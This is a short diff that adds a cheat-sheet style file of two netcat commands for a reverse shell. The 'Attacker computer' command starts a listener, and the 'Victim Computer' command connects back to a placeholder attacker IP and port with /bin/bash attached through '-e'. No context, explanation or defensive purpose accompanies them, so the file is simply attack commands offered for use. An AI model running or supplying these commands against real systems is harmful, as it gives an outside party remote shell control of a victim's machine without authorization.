@@ -1,0 +1,5 @@
+#Attacker computer
+sudo nc -lnvp <port>
+
+#Victim Computer
+nc <attackerip> <port> -e /bin/bash
